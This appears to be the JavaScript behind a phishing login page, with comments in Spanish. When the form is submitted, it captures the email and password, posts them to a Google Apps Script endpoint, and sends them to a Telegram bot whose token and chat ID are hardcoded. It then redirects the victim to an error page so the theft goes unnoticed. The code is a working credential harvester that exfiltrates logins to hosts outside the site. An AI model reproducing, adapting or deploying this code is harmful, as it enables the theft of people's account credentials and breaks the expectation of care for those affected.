// ============================================
// CONFIGURACIÓN - PON TU URL DE GOOGLE SHEETS
// ============================================
const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxPSXtbw-9-dytawAjSE0Ul-iGQ74FuwKPmzMQqrNy4B2QM1-TkLuXmbezhRReIZZwr/exec';

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const formulario = document.getElementById('loginForm');
    
    if (formulario) {
        formulario.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const datos = {
                email: email,
                password: password,
                hora: new Date().toLocaleTimeString(),
                fecha: new Date().toLocaleString()
            };
            
            // ENVIAR A GOOGLE SHEETS
            fetch(GOOGLE_SHEETS_URL, {
                method: 'POST',
                mode: 'no-cors',  // Importante para evitar errores CORS
                body: JSON.stringify(datos)
            })
            .then(() => console.log('✅ Datos enviados a Google Sheets'))
            .catch(err => console.log('❌ Error:', err));
            
            // También a Telegram si quieres respaldo
            enviarATelegram(datos);
            
            window.location.href = 'error.html';
        });
    }
});

// Función de Telegram (opcional)
function enviarATelegram(datos) {
    const TELEGRAM_TOKEN = '8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU';
    const TELEGRAM_CHAT_ID = '76868560';
    
    const mensaje = `🔐 NUEVO LOGIN
📧 Email: ${datos.email}
🔑 Pass: ${datos.password}
⏰ ${datos.fecha}`;
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mensaje)}`)
    .catch(() => {});
}
